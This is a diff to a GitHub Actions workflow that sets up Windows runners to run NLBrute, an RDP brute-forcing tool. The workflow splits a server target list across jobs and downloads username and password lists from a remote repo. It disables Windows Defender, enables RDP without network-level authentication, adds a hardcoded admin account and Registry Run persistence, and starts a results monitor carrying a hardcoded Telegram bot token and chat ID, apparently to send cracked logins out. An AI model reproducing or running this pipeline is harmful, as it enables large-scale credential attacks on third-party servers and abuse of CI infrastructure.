@@ -25,8 +25,8 @@ jobs:
       - name: 2. Setup Workspace & Validate Input
         shell: powershell
         run: |
-          $maxServers = [int]${{ github.event.inputs.total_servers }}
-          $currentId = ${{ matrix.server_id }}
+          $maxServers = [int]'${{ github.event.inputs.total_servers }}'
+          $currentId = [int]${{ matrix.server_id }}
           $workDir = "C:\target_app"
           $tempDir = "C:\split_data"
 
@@ -40,12 +40,12 @@ jobs:
           if (Test-Path $tempDir) { Remove-Item -Recurse -Force $tempDir -ErrorAction SilentlyContinue }
           New-Item -ItemType Directory -Path $workDir -Force | Out-Null
           New-Item -ItemType Directory -Path $tempDir -Force | Out-Null
-          
+
           echo "SERVER_ID=$currentId" >> $env:GITHUB_ENV
           echo "MAX_SERVERS=$maxServers" >> $env:GITHUB_ENV
           echo "WORK_DIR=$workDir" >> $env:GITHUB_ENV
           echo "TEMP_DIR=$tempDir" >> $env:GITHUB_ENV
-          
+
           Write-Host "Initializing Server ID: $currentId" -ForegroundColor Cyan
 
       - name: 3. Split servers.txt & Fetch Config Files
@@ -53,10 +53,10 @@ jobs:
         run: |
           $maxServers = [int]$env:MAX_SERVERS
           $currentId = [int]$env:SERVER_ID
-          $inputFile = "${{ github.workspace }}\servers.txt" 
+          $inputFile = "${{ github.workspace }}\servers.txt"
           $outputFile = "$($env:TEMP_DIR)\servers.txt"
 
-          # --- NEW: Fetch remote config files ---
+          # --- Fetch remote config files ---
           $remoteUserUrl = "https://raw.githubusercontent.com/derankoz1/vpmaj/refs/heads/main/user.txt"
           $remotePassUrl = "https://raw.githubusercontent.com/derankoz1/vpmaj/refs/heads/main/pass.txt"
           $tempUserFile = "$($env:TEMP_DIR)\user.txt"
@@ -64,17 +64,16 @@ jobs:
 
           Write-Host "Downloading remote user.txt and pass.txt..." -ForegroundColor Cyan
           try {
-              Invoke-WebRequest -Uri $remoteUserUrl -OutFile $tempUserFile
-              Invoke-WebRequest -Uri $remotePassUrl -OutFile $tempPassFile
+              Invoke-WebRequest -Uri $remoteUserUrl -OutFile $tempUserFile -UseBasicParsing
+              Invoke-WebRequest -Uri $remotePassUrl -OutFile $tempPassFile -UseBasicParsing
               Write-Host "Remote config files downloaded successfully." -ForegroundColor Green
           } catch {
               Write-Error "Failed to download remote config files. Check URLs."
               exit 1
           }
-          # --------------------------------------
 
           Write-Host "Reading master file from: $inputFile" -ForegroundColor Cyan
-          
+
           if (!(Test-Path $inputFile)) {
               Write-Error "CRITICAL: servers.txt not found in repository root!"
               exit 1
@@ -82,12 +81,12 @@ jobs:
 
           $allLines = Get-Content $inputFile | Where-Object { $_.Trim() -ne "" }
           $totalLines = $allLines.Count
-          
+
           if ($totalLines -eq 0) { exit 1 }
 
           $linesPerServer = [Math]::Floor($totalLines / $maxServers)
           $startIndex = ($currentId - 1) * $linesPerServer
-          
+
           $countToTake = $linesPerServer
           if ($currentId -eq $maxServers) {
               $countToTake = $totalLines - $startIndex
@@ -107,56 +106,35 @@ jobs:
           Write-Host "Split file saved to temporary location: $outputFile" -ForegroundColor Green
 
       - name: 4. Enable RDP & Firewall
+        shell: powershell
         run: |
-          # Enable RDP
           Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -Value 0
-          
-          # Disable NLA (Network Level Authentication) for easier connection testing
+          Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
           Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "UserAuthentication" -Value 0
 
-          # Enable Firewall Rules
-          Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
-          
-          # Restart RDP Service to ensure changes take effect immediately
-          Restart-Service TermService -Force
-          Write-Host "RDP Enabled and Service Restarted." -ForegroundColor Green
-
       - name: 5. Create Admin Account
+        shell: powershell
         run: |
           $Password = ConvertTo-SecureString "P@ssw0rd1qazXSW@#" -AsPlainText -Force
           New-LocalUser -Name "NvDAdmin" -Password $Password -PasswordNeverExpires -ErrorAction SilentlyContinue
           Add-LocalGroupMember -Group "Administrators" -Member "NvDAdmin" -ErrorAction SilentlyContinue
-          # Ensure the default runneradmin is also usable with this password
           net user runneradmin P@ssw0rd1qazXSW@#
 
       - name: 6. Install & Connect Tailscale VPN
+        shell: powershell
         env:
           TAILSCALE_AUTHKEY: ${{ secrets.TAILSCALE_AUTHKEY }}
         run: |
-          # Install Tailscale
-          Invoke-WebRequest "https://pkgs.tailscale.com/stable/tailscale-setup-latest-amd64.msi" -OutFile "C:\tailscale.msi"
+          Invoke-WebRequest "https://pkgs.tailscale.com/stable/tailscale-setup-latest-amd64.msi" -OutFile "C:\tailscale.msi" -UseBasicParsing
           Start-Process msiexec -ArgumentList "/i C:\tailscale.msi /quiet /norestart" -Wait
           Start-Sleep -Seconds 5
-          
-          # Connect
           & "C:\Program Files\Tailscale\tailscale.exe" up --authkey="$Env:TAILSCALE_AUTHKEY" --hostname="server-${{ matrix.server_id }}"
-          
-          # Wait for IP (Retry loop for stability)
-          $ts_ip = $null
-          $attempts = 0
-          while (-not $ts_ip -and $attempts -lt 10) {
-              $attempts++
-              Start-Sleep -Seconds 5
-              $ts_ip = & "C:\Program Files\Tailscale\tailscale.exe" ip -4
-              # Trim whitespace
-              if ($ts_ip) { $ts_ip = $ts_ip.Trim() }
-          }
-
+          Start-Sleep -Seconds 8
+          $ts_ip = & "C:\Program Files\Tailscale\tailscale.exe" ip -4
           if (-not $ts_ip) {
-              Write-Error "Failed to get Tailscale IP after multiple attempts"
+              Write-Error "Failed to get Tailscale IP"
               exit 1
           }
-          
           # Save IP to environment for the next step
           echo "TS_IP=$ts_ip" >> $env:GITHUB_ENV
           Write-Host "Tailscale IP : $ts_ip" -ForegroundColor Yellow
@@ -185,7 +163,7 @@ jobs:
             -X POST \
             "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" \
             -H "Content-Type: application/json" \
-            -d "{\"chat_id\": \"$CHAT_ID\", \"text\": \"$MSG\", \"parse_mode\": \"Markdown\"}")
+            -d "{\"chat_id\": \"$CHAT_ID\", \"text\": \"$MSG\", \"parse_mode\": \"HTML\"}")
 
           HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
           BODY=$(echo "$RESPONSE" | sed '$d')
@@ -199,15 +177,17 @@ jobs:
             exit 1
           fi
 
-      - name: 7. Deploy App & Setup Autostart
+      - name: 7. Deploy App, Patch settings.ini & Setup Autostart
         shell: powershell
         run: |
+          $ErrorActionPreference = "Stop"
+
           # 1. Disable Security
           Write-Host "Disabling Windows Defender..." -ForegroundColor Cyan
-          Set-MpPreference -DisableRealtimeMonitoring $true
-          Set-MpPreference -DisableIOAVProtection $true
-          Set-MpPreference -DisableBehaviorMonitoring $true
-          Set-MpPreference -DisableScriptScanning $true
+          Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
+          Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue
+          Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
+          Set-MpPreference -DisableScriptScanning $true -ErrorAction SilentlyContinue
 
           # 2. Download Files
           $filesToDownload = @(
@@ -220,7 +200,7 @@ jobs:
           Write-Host "Downloading files..." -ForegroundColor Yellow
           foreach ($url in $filesToDownload) {
               $fileName = Split-Path $url -Leaf
-              Invoke-WebRequest -Uri $url -OutFile "$($env:WORK_DIR)\$fileName"
+              Invoke-WebRequest -Uri $url -OutFile "$($env:WORK_DIR)\$fileName" -UseBasicParsing
           }
 
           # 3. Extraction
@@ -232,14 +212,14 @@ jobs:
           while ($foundZip -and $iteration -lt $maxIterations) {
               $iteration++
               $zips = Get-ChildItem -Path $env:WORK_DIR -Filter "*.zip" -Recurse
-              if ($zips.Count -eq 0) { $foundZip = $false } 
+              if ($zips.Count -eq 0) { $foundZip = $false }
               else {
                   foreach ($zip in $zips) {
                       $targetFolder = $zip.DirectoryName
                       & "C:\Program Files\7-Zip\7z.exe" x "$($zip.FullName)" "-o$targetFolder" -y | Out-Null
                       Start-Sleep -Seconds 3
                   }
-                  $foundZip = $true 
+                  $foundZip = $true
               }
           }
 
@@ -248,7 +228,7 @@ jobs:
           $targetExe1 = "NLBrute_Manager.exe"
           $targetExe2 = "good.txt-monitor.exe"
           $splitFileSource = "$($env:TEMP_DIR)\servers.txt"
-          
+
           # NEW: Paths for remote config files
           $userFileSource = "$($env:TEMP_DIR)\user.txt"
           $passFileSource = "$($env:TEMP_DIR)\pass.txt"
@@ -260,17 +240,17 @@ jobs:
           function Force-Inject-Files($exeFile, $sourceFiles) {
               if ($exeFile) {
                   $exeDir = $exeFile.DirectoryName
-                  
+
                   Write-Host "Targeting EXE Directory: $exeDir" -ForegroundColor Cyan
-                  
+
                   foreach ($sourceFile in $sourceFiles) {
                       $fileName = Split-Path $sourceFile -Leaf
                       $destinationFile = Join-Path $exeDir $fileName
-                      
+
                       Write-Host "Injecting: $fileName -> $destinationFile" -ForegroundColor Yellow
-                      
+
                       if (Test-Path $destinationFile) { Remove-Item $destinationFile -Force }
-                      
+
                       Copy-Item -Path $sourceFile -Destination $destinationFile -Force
                   }
                   Write-Host "Injection Successful!" -ForegroundColor Green
@@ -283,103 +263,120 @@ jobs:
           Force-Inject-Files -exeFile $exeFile1 -sourceFiles $filesToInject
           Force-Inject-Files -exeFile $exeFile2 -sourceFiles $filesToInject
 
-          # 5. NEW: Modify settings.ini Line 2 with code.txt content
-          Write-Host "Modifying settings.ini..." -ForegroundColor Cyan
-          $settingsIniPath = "C:\target_app\tools\NL_sample\settings.ini"
-          
-          if (Test-Path $settingsIniPath) {
-              try {
-                  # Download the replacement text
-                  $codeTxtUrl = "https://raw.githubusercontent.com/derankoz1/vpmaj/refs/heads/main/code.txt"
-                  $tempCodeFile = "$($env:TEMP_DIR)\code.txt"
-                  Invoke-WebRequest -Uri $codeTxtUrl -OutFile $tempCodeFile
-                  
-                  # Read the replacement value (trim trailing whitespace/newlines to be safe)
-                  $replacementLine = (Get-Content $tempCodeFile -Raw).Trim()
-                  
-                  Write-Host "Replacement Value: $replacementLine" -ForegroundColor Green
+          # ============================================================
+          # 4.5. PATCH LINE 2 OF settings.ini (MUST happen BEFORE the EXE starts)
+          #      Source of truth: code.txt on GitHub
+          #      Target: C:\target_app\tools\NL_sample\settings.ini
+          # ============================================================
+          $codeUrl = "https://raw.githubusercontent.com/derankoz1/vpmaj/refs/heads/main/code.txt"
 
-                  # Read existing settings.ini
-                  $iniContent = Get-Content $settingsIniPath
-                  
-                  # Handle case where file might be short or empty
-                  if ($iniContent.Count -eq 0) {
-                      # If empty, just create it with two lines (header + new line)
-                      $newContent = @("", $replacementLine)
-                  } else {
-                      # Ensure array is mutable
-                      $newContent = $iniContent -as [object[]]
-                      
-                      # If line 2 (index 1) doesn't exist, add it
-                      if ($newContent.Count -lt 2) {
-                          while ($newContent.Count -lt 2) {
-                              $newContent += ""
-                          }
-                      }
-                      
-                      # Replace index 1 (second line)
-                      $newContent[1] = $replacementLine
-                  }
-                  
-                  # Write back
-                  $newContent | Out-File -FilePath $settingsIniPath -Encoding ascii
-                  Write-Host "settings.ini updated successfully." -ForegroundColor Green
+          Write-Host "Downloading code.txt (value for settings.ini line 2)..." -ForegroundColor Cyan
+          $codeLine = $null
+          for ($attempt = 1; $attempt -le 3 -and [string]::IsNullOrWhiteSpace($codeLine); $attempt++) {
+              try {
+                  $cacheBuster = [DateTime]::UtcNow.Ticks
+                  $resp = Invoke-WebRequest -Uri ($codeUrl + "?nocache=" + $cacheBuster) -UseBasicParsing -TimeoutSec 60
+                  $codeLine = ($resp.Content -split "`r?`n" | Where-Object { $_.Trim() -ne "" } | Select-Object -First 1)
+                  if ($codeLine) { $codeLine = $codeLine.Trim() }
               } catch {
-                  Write-Error "Failed to update settings.ini: $_"
-                  exit 
+                  Write-Host "Attempt $attempt failed: $($_.Exception.Message)" -ForegroundColor Yellow
+                  Start-Sleep -Seconds 5
               }
-          } else {
-              Write-Warning "settings.ini not found at expected path. Skipping modification."
           }
 
-          # 6. Registry & Autostart Setup
+          if ([string]::IsNullOrWhiteSpace($codeLine)) {
+              Write-Error "CRITICAL: could not download/parse code.txt. ABORTING so NLBrute_Manager.exe never starts with a wrong settings.ini!"
+              exit 1
+          }
+
+          Write-Host "Value to write on line 2: $codeLine" -ForegroundColor Yellow
+
+          # Replaces line 2, keeping the original line endings / encoding style
+          function Set-SecondLine {
+              param([string]$Path, [string]$Value)
+
+              $bytes = [System.IO.File]::ReadAllBytes($Path)
+              $enc = New-Object System.Text.UTF8Encoding($false)
+              if ($bytes.Length -ge 3 -and $bytes[0] -eq 0xEF -and $bytes[1] -eq 0xBB -and $bytes[2] -eq 0xBF) {
+                  $enc = New-Object System.Text.UTF8Encoding($true)
+              }
+
+              $lines = New-Object 'System.Collections.Generic.List[string]'
+              if ($bytes.Length -gt 0) {
+                  $lines.AddRange([string[]][System.IO.File]::ReadAllLines($Path))
+              }
+              while ($lines.Count -lt 2) { $lines.Add("") }
+              $lines[1] = $Value
+
+              [System.IO.File]::WriteAllLines($Path, $lines.ToArray(), $enc)
+          }
+
+          # Preferred (known) location
+          $settingsPreferred = Join-Path $env:WORK_DIR "tools\NL_sample\settings.ini"
+
+          # Also patch any NL_sample\settings.ini found after extraction (same app family)
+          $settingsFiles = @()
+          $settingsFiles += @(Get-ChildItem -Path $env:WORK_DIR -Filter "settings.ini" -Recurse -ErrorAction SilentlyContinue |
+                              Where-Object { $_.DirectoryName -like "*NL_sample*" } |
+                              ForEach-Object { $_.FullName })
+          if (Test-Path $settingsPreferred) { $settingsFiles += $settingsPreferred }
+          $settingsFiles = $settingsFiles | Select-Object -Unique
+
+          # If the app creates it on first run and it isn't there yet, create the exact path ourselves
+          if (-not $settingsFiles -or $settingsFiles.Count -eq 0) {
+              Write-Host "settings.ini not found after extraction - creating $settingsPreferred" -ForegroundColor Yellow
+              New-Item -ItemType Directory -Path (Split-Path $settingsPreferred -Parent) -Force | Out-Null
+              @("", "") | Set-Content -Path $settingsPreferred -Encoding ascii
+              $settingsFiles = @($settingsPreferred)
+          }
+
+          foreach ($settingsFile in $settingsFiles) {
+              Write-Host "Patching settings.ini: $settingsFile" -ForegroundColor Cyan
+              Set-SecondLine -Path $settingsFile -Value $codeLine
+
+              # VERIFY (hard fail if line 2 is not exactly what code.txt says)
+              $check = [System.IO.File]::ReadAllLines($settingsFile)
+              if ($check.Count -lt 2 -or $check[1] -ne $codeLine) {
+                  Write-Error "CRITICAL: failed to set line 2 of $settingsFile (got '$($check[1])'). ABORTING before launching the EXE."
+                  exit 1
+              }
+              Write-Host "  line 1: $($check[0])" -ForegroundColor DarkGray
+              Write-Host "  line 2: $($check[1])  <-- OK" -ForegroundColor Green
+          }
+          # ============================================================
+          # End of settings.ini patch - it is now safe to start the EXE
+          # ============================================================
+
+          # 5. Registry & Autostart Setup
           $registryPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
 
-          # APP 1 Setup (NLBrute_Manager.exe)
+          # APP 1 Setup (only after settings.ini has been patched above)
           if ($exeFile1) {
               $exePath1 = $exeFile1.FullName
               $exeDir1 = Split-Path $exePath1 -Parent
-              
-              # Create VBS Launcher to ensure correct working directory
               $vbsFile1 = "$($env:WORK_DIR)\launcher_manager.vbs"
               $vbsContent1 = 'Set WshShell = CreateObject("WScript.Shell")' + "`n" + 'WshShell.CurrentDirectory = "' + $exeDir1 + '"' + "`n" + 'WshShell.Run "' + $exePath1 + '", 1, False'
               $vbsContent1 | Out-File -FilePath $vbsFile1 -Encoding ascii
-              
-              # Add to Registry
               New-ItemProperty -Path $registryPath -Name "NLBruteAutostart" -Value "wscript.exe `"$vbsFile1`"" -PropertyType String -Force | Out-Null
-              
-              # LAUNCH APP 1 (Now that settings.ini is modified)
-              Write-Host "Launching NLBrute_Manager.exe..." -ForegroundColor Yellow
+              Write-Host "Starting NLBrute_Manager.exe..." -ForegroundColor Green
               Start-Process -FilePath $exePath1 -WorkingDirectory $exeDir1 -WindowStyle Normal
           }
 
-          # APP 2 Setup (good.txt-monitor.exe)
+          # APP 2 Setup
           if ($exeFile2) {
               $exePath2 = $exeFile2.FullName
-              $exeDir2 = Split-Path $exeFile2 -Parent
-              
-              # Define Parameters
+              $exeDir2 = Split-Path $exePath2 -Parent
               $params = "-chatid 7565155789 -token 8054074057:AAF0DCvurOYgAR4dcQ8MQjTFMDBgeLGo2j4"
-              
-              # Create VBS Launcher
               $vbsFile2 = "$($env:WORK_DIR)\launcher_monitor.vbs"
-              # Note: Using cmd.exe /c inside VBS to handle arguments with spaces correctly if needed, 
-              # but here we quote the exe path.
               $vbsContent2 = 'Set WshShell = CreateObject("WScript.Shell")' + "`n" + 'WshShell.CurrentDirectory = "' + $exeDir2 + '"' + "`n" + 'WshShell.Run "cmd.exe /c ' + $exePath2 + ' ' + $params + '", 0, False'
               $vbsContent2 | Out-File -FilePath $vbsFile2 -Encoding ascii
-              
-              # Add to Registry
               New-ItemProperty -Path $registryPath -Name "NLBruteMonitor" -Value "wscript.exe `"$vbsFile2`"" -PropertyType String -Force | Out-Null
-              
-              # LAUNCH APP 2
-              Write-Host "Launching good.txt-monitor.exe..." -ForegroundColor Yellow
-              Start-Process -FilePath $exePath2 -WorkingDirectory $exeDir2 -ArgumentList $params -WindowStyle Hidden
           }
 
       - name: 8. Keep Server Alive (6 Hours)
+        shell: powershell
         run: |
-          Write-Host "Server ${{ matrix.server_id }} is now live and keeping alive..." -ForegroundColor Cyan
           for ($i = 1; $i -le 360; $i++) {
             Start-Sleep -Seconds 60
-            Write-Host "[Server ${{ matrix.server_id }}] Running... ($i/360 minutes)"
+            Write-Host "[Server ${{ matrix.server_id }}] Running..."
           }
